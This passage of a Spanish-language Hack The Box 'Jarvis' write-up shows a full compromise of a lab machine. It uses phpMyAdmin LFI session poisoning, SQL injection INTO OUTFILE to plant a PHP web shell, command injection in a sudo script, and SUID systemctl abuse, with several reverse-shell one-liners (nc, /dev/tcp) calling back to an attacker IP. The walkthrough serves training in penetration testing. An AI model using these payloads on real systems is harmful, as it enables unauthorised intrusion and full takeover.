+phpMyAdmin 4.8.1 - <span class="o">(</span>Authenticated<span class="o">)</span> Local File Inclusion <span class="o">(</span>2<span class="o">)</span>                                    | php/webapps/44928.txt
+phpMyAdmin 4.8.4 - <span class="s1">'AllowArbitraryServer'</span> Arbitrary File Read                                  | php/webapps/46041.py
+<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Shellcodes: No Results
+</code></pre></div></div>
+
+<p>Vemos 2 los cuales parte de un LFI para obtener RCE y de una manera mejor explicada, podemos consultar el recurso <a href="https://www.vulnspy.com/phpmyadmin-4.8.1/">Vulnspy</a> en donde nos indica que primero debemos contar con credenciales de acceso (ya las tenemos), después realizar la consulta SQL en donde vamos a insertar código php (en el ejemplo se pone <code class="language-plaintext highlighter-rouge">select '&lt;?php phpinfo();exit;?&gt;'</code>) en donde pondremos nuestro código malicioso; posteriormente consultamos una sesión generada a partir de la consulta utilizando el valor de la cookie <strong>phpMyAdmin</strong> (en el ejemplo nos indica que la ruta es <code class="language-plaintext highlighter-rouge">/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_[el_valor_de_la_cookie]</code>). Siguiendo dichos pasos, logramos ser el <code class="language-plaintext highlighter-rouge">phpinfo()</code>, por lo tanto ahora debemos entablarnos una reverse shell para ganar acceso a la máquina (<strong>Nota</strong>: Si tratamos de hacer lo indicado con el comando <code class="language-plaintext highlighter-rouge">phpinfo()</code>, es necesario salir de la sesión y volver a entrar al panel de login).</p>
+
+<ul>
+  <li>Generamos nuestra reverse shell: <code class="language-plaintext highlighter-rouge">&lt;?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.27 443 &gt;/tmp/f");exit;?&gt;</code>.</li>
+  <li>Nos ponemos en escucha por el puerto 443: <code class="language-plaintext highlighter-rouge">nc -nlvp 443</code>
+</li>
+  <li>Con el plugin <strong>Edit this cookie</strong> obtenemos nuestra cookie para el campo <strong>phpMyAdmin</strong>: glpacrhpqr2ancitvpu72p59j1jkljoc</li>
+  <li>Ahora accedemos al siguiente recurso: <strong>10.10.10.143/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_glpacrhpqr2ancitvpu72p59j1jkljoc</strong>
+</li>
+</ul>
+
+<p><img src="/assets/images/htb-jarvis/jarvis-cookie.png" alt=""></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ❯ nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.27] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.143] 39822
+/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
+$ whoami
+www-data
+$ 
+</span></code></pre></div></div>
+
+<p>Ya nos encontramos dentro de la máquina como el usuario <strong>www-data</strong>; sin embargo, no podemos visualizar la flag.</p>
+
+<p>Otra manera de comprometer el equipo es mediante la inclusión de archivos en conjunto con la inyección de comandos SQL, para este caso utilizaremos la sentencia <code class="language-plaintext highlighter-rouge">union select 1,2,3,4,5,6,7-- -</code> en lugar de poner el número 3 vamos a tratar de poner un texto y posteriormente guardarlo en un archivo bajo una ruta del sistema, que si recordamos, podemos acceder a <strong>images</strong> y vamos a suponer que se encuentra en la ruta absoluta <code class="language-plaintext highlighter-rouge">/var/www/html/images</code>. Por lo tanto, nuestra sentencia sería <code class="language-plaintext highlighter-rouge">union select 1,2,"Esto es una prueba",4,5,6,7 into outfile "/var/www/html/images/test.txt"</code>:</p>
+
+<p><img src="/assets/images/htb-jarvis/jarvis-web7.png" alt=""></p>
+
+<p><img src="/assets/images/htb-jarvis/jarvis-web8.png" alt=""></p>
+
+<p><img src="/assets/images/htb-jarvis/jarvis-web9.png" alt=""></p>
+
+<p>Vemos que podemos crear archivos y acceder a ellos, por lo que ya debemos estar pensando en tratar de subir de archivo php que nos permita la ejecución de comandos. Nuestra sentencia sería la siguiente:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>union <span class="k">select </span>1,2,<span class="s2">"&lt;?php echo shell_exec(</span><span class="nv">$_REQUEST</span><span class="s2">['cmd']); ?&gt;"</span>,4,5,6,7 into outfile <span class="s2">"/var/www/html/images/shell.php"</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-jarvis/jarvis-web10.png" alt=""></p>
+
+<p>Hemos logrado tener ejecución de comandos a nivel de sistema, así que lo único que nos queda es entablarnos una reverse shell a nuestra máquina de atacante y haremos uso de <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">PentestMonkey</a></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.10.143/images/shell.php?cmd<span class="o">=</span>nc <span class="nt">-e</span> /bin/sh 10.10.14.27 443
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.27] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.143] 39846
+<span class="nb">whoami
+</span>www-data
+</code></pre></div></div>
+
+<p>Como siempre y para trabajar más comodos, vamos a hacer un <a href="/tratamiento-tty">Tratamiento de la tty</a>. Ahora vamos a enumerar un poco el sistema para ver la forma en la que podamos escalar privilegios.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@jarvis:/var/www/html/images<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+www-data@jarvis:/var/www/html/images<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>www-data on jarvis:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
+
+User www-data may run the following commands on jarvis:
+    <span class="o">(</span>pepper : ALL<span class="o">)</span> NOPASSWD: /var/www/Admin-Utilities/simpler.py
+www-data@jarvis:/var/www/html/images<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Vemos que podemos ejecutar el script <code class="language-plaintext highlighter-rouge">/var/www/Admin-Utilities/simpler.py</code> como el usuario <strong>pepper</strong>. Si checamos, tenemos permisos de lectura y una de las opciones que ya nos debería llamar la atención sería el parámetro <code class="language-plaintext highlighter-rouge">-p</code>, el cual nos permitiría ejecutar comandos a nivel de sistema como el usuario <strong>pepper</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@jarvis:/var/www/html/images<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span> pepper /var/www/Admin-Utilities/simpler.py
+<span class="k">***********************************************</span>
+     _                 _                       
+ ___<span class="o">(</span>_<span class="o">)</span>_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
+/ __| | <span class="s1">'_ ` _ \| '</span>_ <span class="se">\|</span> |/ _ <span class="se">\ </span><span class="s1">'__| '</span>_ <span class="se">\|</span> | | |
+<span class="se">\_</span>_ <span class="se">\ </span>| | | | | | |_<span class="o">)</span> | |  __/ |_ | |_<span class="o">)</span> | |_| |
+|___/_|_| |_| |_| .__/|_|<span class="se">\_</span>__|_<span class="o">(</span>_<span class="o">)</span>| .__/ <span class="se">\_</span>_, |
+                |_|               |_|    |___/ 
+                                @ironhackers.es
+                                
+<span class="k">***********************************************</span>
+
+
+<span class="k">********************************************************</span>
+<span class="k">*</span> Simpler   -   A simple simplifier <span class="p">;</span><span class="o">)</span>                 <span class="k">*</span>
+<span class="k">*</span> Version 1.0                                          <span class="k">*</span>
+<span class="k">********************************************************</span>
+Usage:  python3 simpler.py <span class="o">[</span>options]
+
+Options:
+    <span class="nt">-h</span>/--help   : This <span class="nb">help</span>
+    <span class="nt">-s</span>          : Statistics
+    <span class="nt">-l</span>          : List the attackers IP
+    <span class="nt">-p</span>          : ping an attacker IP
+    
+www-data@jarvis:/var/www/html/images<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Podríamos tratar de ejecutar las siguientes opciones:</p>
+<ul>
+  <li>10.10.14.27; whoami</li>
+  <li>10.10.14.27 &amp;&amp; whoami</li>
+  <li>
+    <table>
+      <tbody>
+        <tr>
+          <td>loquesea</td>
+          <td> </td>
+          <td>whoami</td>
+        </tr>
+      </tbody>
+    </table>
+  </li>
+  <li>$(whoami)</li>
+</ul>
+
+<p>El último comando no nos muestra nada y para los anteriores se tiene el mensaje <strong><em>Got you</em></strong>; por lo que es posible que se esté ejecutando; así que vamos a crear un archivo en bash bajo la ruta <code class="language-plaintext highlighter-rouge">/dev/shm</code> que nos entable una reverse shell a nuestra máquina.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@jarvis:/dev/shm<span class="nv">$ </span><span class="nb">cat </span>shell.sh 
+<span class="c">#!/bin/bash</span>
+
+bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.27/443 0&gt;&amp;1
+www-data@jarvis:/dev/shm<span class="nv">$ </span><span class="nb">chmod</span> +x shell.sh 
+www-data@jarvis:/dev/shm<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
+total 4
+<span class="nt">-rwxr-xr-x</span> 1 www-data www-data 54 Dec 31 23:26 shell.sh
+www-data@jarvis:/dev/shm<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Y ahora vamos a ejecutar el script <code class="language-plaintext highlighter-rouge">simpler.py</code> indicanle que queremos ejecutar un comando a nivel de sistema; además nos ponemos en escucha por el puerto 443.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@jarvis:/dev/shm<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span> pepper /var/www/Admin-Utilities/simpler.py <span class="nt">-p</span>
+<span class="k">***********************************************</span>
+     _                 _                       
+ ___<span class="o">(</span>_<span class="o">)</span>_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
+/ __| | <span class="s1">'_ ` _ \| '</span>_ <span class="se">\|</span> |/ _ <span class="se">\ </span><span class="s1">'__| '</span>_ <span class="se">\|</span> | | |
+<span class="se">\_</span>_ <span class="se">\ </span>| | | | | | |_<span class="o">)</span> | |  __/ |_ | |_<span class="o">)</span> | |_| |
+|___/_|_| |_| |_| .__/|_|<span class="se">\_</span>__|_<span class="o">(</span>_<span class="o">)</span>| .__/ <span class="se">\_</span>_, |
+                |_|               |_|    |___/ 
+                                @ironhackers.es
+                                
+<span class="k">***********************************************</span>
+
+Enter an IP: <span class="si">$(</span>bash /dev/shm/shell.sh<span class="si">)</span>
+
+
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.27] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.143] 39848
+pepper@jarvis:/dev/shm<span class="nv">$ </span><span class="nb">whoami
+whoami
+</span>pepper
+pepper@jarvis:/dev/shm<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Ya nos encontramos dentro de la máquina como el usuario <strong>pepper</strong> y podemos visualizar la flag (user.txt). Ahora nos falta convertirnos en el usuario <strong>root</strong>; pero antes, vamos a hacer nuestro <a href="/tratamiento-tty">Tratamiento de la tty</a> para trabajar mejor. Enumeraremos un poco el sitema a ver que hay:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pepper@jarvis:~<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>pepper<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>pepper<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>pepper<span class="o">)</span>
+pepper@jarvis:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>pepper: 
+pepper@jarvis:~<span class="nv">$ </span><span class="nb">cd</span> /
+pepper@jarvis:/<span class="nv">$ </span>find <span class="se">\-</span>perm <span class="nt">-4000</span> 2&gt;/dev/null
+./bin/fusermount
+./bin/mount
+./bin/ping
+./bin/systemctl
+./bin/umount
+./bin/su
+./usr/bin/newgrp
+./usr/bin/passwd
+./usr/bin/gpasswd
+./usr/bin/chsh
+./usr/bin/sudo
+./usr/bin/chfn
+./usr/lib/eject/dmcrypt-get-device
+./usr/lib/openssh/ssh-keysign
+./usr/lib/dbus-1.0/dbus-daemon-launch-helper
+pepper@jarvis:/<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Vemos el binario <code class="language-plaintext highlighter-rouge">/bin/systemctl</code> tiene permisos SUID, por lo que podríamos ejecutarlo como el propietario del archivo, en este caso <strong>root</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pepper@jarvis:/<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /bin/systemctl
+<span class="nt">-rwsr-x---</span> 1 root pepper 174520 Feb 17  2019 /bin/systemctl
+pepper@jarvis:/<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Asi que vamos a crearnos un servicio y en caso de no saber como, podríamos echarle un ojo al siguiente recurso <a href="https://www.tecmint.com/create-new-service-units-in-systemd/">Tecmint</a>. Asi que en el directorio home del usuario <strong>pepper</strong> vamos a crear un directorio y dentro el archivo que necesitamos en donde le indicamos que ejecute nuestra reverse shell en <code class="language-plaintext highlighter-rouge">/dev/shm/</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pepper@jarvis:/<span class="nv">$ </span><span class="nb">cd</span> /home/pepper/
+pepper@jarvis:~<span class="nv">$ </span><span class="nb">mkdir </span>privesc
+pepper@jarvis:~<span class="nv">$ </span><span class="nb">cd</span> <span class="o">!</span><span class="err">$</span>
+<span class="nb">cd </span>privesc
+pepper@jarvis:~/privesc<span class="nv">$ </span>nano privesc.service
+pepper@jarvis:~/privesc<span class="nv">$ </span><span class="nb">cat </span>privesc.service 
+<span class="o">[</span>Unit]
+Description <span class="o">=</span> Privesc
+
+<span class="o">[</span>Service]
+<span class="nv">Type</span><span class="o">=</span>oneshot
+ExecStart <span class="o">=</span> /dev/shm/shell.sh
+
+<span class="o">[</span>Install]
+WantedBy <span class="o">=</span> multi-user.target
+pepper@jarvis:~/privesc<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Ahora creamos un link de nuestro servicio y lo habilitamos, para esto ya debemos estar en escucha por el puerto 443:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pepper@jarvis:~/privesc<span class="nv">$ </span>systemctl <span class="nb">link</span> /home/pepper/privesc/privesc.service 
+Created symlink /etc/systemd/system/privesc.service -&gt; /home/pepper/privesc/privesc.service.
+pepper@jarvis:~/privesc<span class="nv">$ </span>systemctl <span class="nb">enable</span> <span class="nt">--now</span> /home/pepper/privesc/privesc.service
+Created symlink /etc/systemd/system/multi-user.target.wants/privesc.service -&gt; /home/pepper/privesc/privesc.service.
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.27] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.143] 39850
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1216<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+root@jarvis:/# <span class="nb">whoami
+whoami
+</span>root
+root@jarvis:/# 
+</code></pre></div></div>
+
+<p>Ya nos encontramos como el usuario <strong>root</strong> y podemos visualizar la flag (root.txt).</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#injection" class="page__taxonomy-item" rel="tag">Injection</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#sql" class="page__taxonomy-item" rel="tag">SQL</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#sqli" class="page__taxonomy-item" rel="tag">SQLi</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#web" class="page__taxonomy-item" rel="tag">Web</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#linux" class="page__taxonomy-item" rel="tag">Linux</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#medium" class="page__taxonomy-item" rel="tag">Medium</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2021-12-31T00:00:00-06:00">December 31, 2021</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-secnotes/" class="pagination--pager" title="Hack The Box SecNotes
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">© 2021 K4miyo</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
